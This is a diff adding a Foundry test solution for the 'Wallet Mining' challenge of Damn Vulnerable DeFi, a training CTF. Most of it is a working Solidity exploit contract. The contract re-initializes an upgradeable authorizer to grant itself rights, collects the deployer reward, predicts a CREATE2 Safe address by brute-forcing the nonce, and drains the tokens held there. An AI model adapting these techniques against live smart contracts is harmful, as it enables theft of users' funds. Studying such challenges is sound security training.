@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -123,7 +124,8 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(token, authorizer, walletDeployer, proxyFactory, singletonCopy);
+        attack.attack();
     }
 
     /**
@@ -154,5 +156,133 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Attack is Test {
+    address ward = makeAddr("ward");
+    address user;
+    uint256 userPrivateKey;
+    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
+
+    address player;
+    DamnValuableToken token;
+    AuthorizerUpgradeable authorizer;
+    WalletDeployer walletDeployer;
+    SafeProxyFactory proxyFactory;
+    Safe singletonCopy;
+
+    uint256 userNonce;
+
+    constructor(
+        DamnValuableToken _token,
+        AuthorizerUpgradeable _authorizer,
+        WalletDeployer _walletDeployer,
+        SafeProxyFactory _proxyFactory,
+        Safe _singletonCopy
+    ) {
+        (user, userPrivateKey) = makeAddrAndKey("user");
+
+        player = msg.sender;
+        token = _token;
+        authorizer = _authorizer;
+        walletDeployer = _walletDeployer;
+        proxyFactory = _proxyFactory;
+        singletonCopy = _singletonCopy;
+    }
+
+    function attack() public {
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+
+        uint256 thisNonce = 0;
+        bytes memory thisInitializer = normalInitializer(address(this));
+        wards[0] = address(this);
+        aims[0] = getProxyAddress(thisNonce, thisInitializer);
+
+        authorizer.init(wards, aims);
+
+        require(walletDeployer.drop(aims[0], thisInitializer, thisNonce), "drop fail");
+        token.transfer(ward, walletDeployer.pay());
+
+        require(findUserNonce(), "can't find nonce");
+        bytes memory userInitializer = normalInitializer(user);
+        SafeProxy proxy = proxyFactory.createProxyWithNonce(address(singletonCopy), userInitializer, userNonce);
+        require(address(proxy) == USER_DEPOSIT_ADDRESS, "proxy wrong address");
+
+        safeExecTransaction(
+            USER_DEPOSIT_ADDRESS,
+            address(token),
+            abi.encodeCall(token.transfer, (user, token.balanceOf(USER_DEPOSIT_ADDRESS)))
+        );
+    }
+
+    function safeExecTransaction(address safeProxyAddress, address to, bytes memory data) public returns (bool) {
+        return Safe(payable(safeProxyAddress)).execTransaction(
+            // Transaction info
+            to,
+            0,
+            data,
+            Enum.Operation.Call,
+            0,
+            // Payment info
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            getUserSignature(safeProxyAddress, to, data)
+        );
+    }
+
+    function getUserSignature(address safeProxyAddress, address to, bytes memory data)
+        public
+        view
+        returns (bytes memory signature)
+    {
+        bytes memory txHashData = Safe(payable(safeProxyAddress)).encodeTransactionData(
+            // Transaction info
+            to,
+            0,
+            data,
+            Enum.Operation.Call,
+            0,
+            // Payment info
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            // Signature info
+            0
+        );
+        bytes32 txHash = keccak256(txHashData);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        signature = abi.encodePacked(r, s, v);
+    }
+
+    function findUserNonce() public returns (bool) {
+        for (uint256 i = 0; i < uint256(type(uint8).max); i++) {
+            if (getProxyAddress(i, normalInitializer(user)) == USER_DEPOSIT_ADDRESS) {
+                userNonce = i;
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function getProxyAddress(uint256 saltNonce, bytes memory initializer) public view returns (address) {
+        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
+        bytes32 deploymentData =
+            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
+        return address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, deploymentData))))
+        );
+    }
+
+    function normalInitializer(address owner) public pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = owner;
+        bytes memory initializer =
+            abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0))));
+        return initializer;
     }
 }
